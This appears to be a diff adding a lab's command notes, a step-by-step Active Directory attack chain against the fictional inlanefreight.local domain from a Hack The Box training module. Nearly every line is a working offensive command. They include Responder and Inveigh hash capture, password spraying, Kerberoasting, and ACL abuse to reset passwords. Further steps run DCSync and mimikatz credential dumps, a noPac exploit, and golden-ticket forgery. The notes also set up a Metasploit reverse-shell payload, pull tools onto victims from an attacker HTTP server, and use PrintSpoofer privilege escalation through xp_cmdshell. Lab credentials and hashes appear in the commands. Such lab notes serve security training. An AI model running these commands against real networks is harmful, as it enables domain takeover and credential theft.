@@ -1,0 +1,463 @@
+nslookup -type=TXT inlanefreight.com
+
+ssh htb-student@STMIP
+
+sudo nmap -A -v -Pn 172.16.5.5
+
+sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
+
+awk '/1433\/open/ {print $2}' nmapOutput
+
+ssh htb-student@STMIP
+
+sudo responder -I ens224
+
+echo "HASH" > capturedHash.txt
+
+hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz
+
+echo "HASH" > wleyCapturedHash.txt
+
+hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+Import-Module .\Inveigh.ps1
+
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"
+
+type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
+
+echo "HASH" > svc_qualysCapturedHash.txt
+
+perl -p -i -e 's/\R//g;' svc_qualysCapturedHash.txt
+
+hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt
+
+ssh htb-student@STMIP
+
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40
+
+ssh htb-student@STMIP
+
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt
+
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+Import-Module .\DomainPasswordSpray.ps1
+
+Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spraySuccess.txt -ErrorAction SilentlyContinue
+
+ssh htb-student@STMIP
+
+rpcclient -U "" -N 172.16.5.5
+
+queryuser 1170
+
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+.\SharpHound.exe
+
+cd .\BloodHound-GUI\
+
+.\BloodHound.exe
+
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+Get-MpComputerStatus
+
+net localgroup Administrators
+
+dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
+
+ssh htb-student@STMIP
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+
+hashcat -m 13100 -W 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1
+
+cd C:\Tools\
+
+.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
+
+sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+Import-Module .\PowerView.ps1
+
+$sid = Convert-NameToSid forend
+
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Import-Module .\PowerView.ps1
+
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"
+
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+Import-Module .\PowerView.ps1
+
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+
+cd C:\Tools\mimikatz\x64\
+
+.\mimikatz.exe
+
+lsadump::dcsync /user:INLANEFREIGHT\syncron
+
+lsadump::dcsync /user:INLANEFREIGHT\khartsfield
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+.\SharpHound.exe
+
+cd .\BloodHound-GUI\
+
+.\BloodHound.exe
+
+ssh htb-student@172.16.5.225
+
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+enable_xp_cmdshell
+
+xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
+
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+ssh htb-student@STMIP
+
+cd /opt/noPac/
+
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+Import-Module .\PowerView.ps1
+
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
+
+hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+Import-Module .\PowerView.ps1
+
+Get-DomainTrustMapping
+
+xfreerdp /v:STMIP /u:htb-student_adm /p:HTB_@cademy_stdnt_admin!
+
+Import-Module .\PowerView.ps1
+
+Get-DomainSID
+
+Get-DomainObject -Identity "Enterprise Admins" -Domain INLANEFREIGHT.LOCAL | select samaccountname,objectsid
+
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
+
+ssh htb-student@STMIP
+
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross
+
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+
+cd C:\Tools\
+
+.\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap
+
+hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
+
+ssh htb-student@STMIP
+
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley
+
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley
+
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+smbexec.py freightlogistics/sapsso@freightlogistics.local
+
+type C:\users\administrator\desktop\flag.txt
+
+cat c:\users\administrator\desktop\flag.txt
+
+sudo msfconsole -q
+
+search web_delivery
+
+use 1
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST PWNIP
+
+set SRVHOST PWNIP
+
+set TARGET 2
+
+exploit
+
+ps
+
+getpid
+
+migrate <winlogon.exe pid>
+
+wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+python3 -m http.server PWNPO
+
+shell
+
+cd C:\
+
+certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1
+
+powershell
+
+Import-Module .\PowerView.ps1
+
+Get-DomainUser * -SPN | select samaccountname
+
+Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
+
+echo 'HASH' | tr -d "[:space:]" > tgs_file
+
+hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt
+
+run autoroute -s 172.16.6.0/24
+
+bg
+
+use auxiliary/scanner/portscan/tcp
+
+set rhosts 172.16.6.0/24
+
+set PORTS 139,445
+
+set threads 50
+
+run
+
+use auxiliary/server/socks_proxy
+
+show options
+
+run
+
+sudo nano /etc/proxychains.conf
+
+sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
+
+sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
+
+proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
+
+Import-Module .\PowerView.ps1
+
+$sid = Convert-NameToSid tpetty
+
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
+
+proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
+
+hostname
+
+type C:\users\administrator\desktop\flag.txt
+
+ssh htb-student@STMIP
+
+sudo responder -I ens224 -wrfv
+
+hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz
+
+sudo nmap -p 88,445,3389 --open 172.16.7.0/24
+
+bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
+
+nmap -A 172.16.7.50
+
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution
+
+wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+
+scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop
+
+scp kerbrute_windows_amd64.exe htb-student@STMIP:/home/htb-student/Desktop
+
+cd .\Desktop\
+
+Set-ExecutionPolicy Bypass -Scope Process
+
+Import-Module .\PowerView.ps1
+
+Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
+
+Get-Content .\adusers.txt | select -First 10
+
+.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
+
+wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
+
+scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop
+
+runas /netonly /user:INLANEFREIGHT\BR086 powershell
+
+cd C:\users\AB920\Desktop
+
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+
+mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60
+
+enable_xp_cmdshell
+
+xp_cmdshell whoami /priv
+
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
+
+python3 -m http.server PWNPO
+
+xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
+
+xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+
+smbclient -U "administrator" \\\\172.16.7.60\\C$
+
+cd Users\Administrator\Desktop\
+
+get flag.txt
+
+exit
+
+cat flag.txt
+
+sudo msfconsole -q
+
+search web_delivery
+
+use 1
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set TARGET 2
+
+set SRVHOST 172.16.7.240
+
+set LHOST 172.16.7.240
+
+exploit
+
+xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e <PAYLOAD>"
+
+sessions -i 1
+
+shell
+
+whoami
+
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz64.exe
+
+scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
+
+upload mimikatz64.exe
+
+shell
+
+mimikatz64.exe
+
+privilege::debug
+
+sekurlsa::logonpasswords
+
+sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
+
+xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution
+
+wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
+
+Import-Module .\Inveigh.ps1
+
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz
+
+xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution
+
+net user administrator Welcome1 /domain
+
+wmiexec.py administrator@172.16.7.3
+
+type C:\Users\administrator\desktop\flag.txt
+
+secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
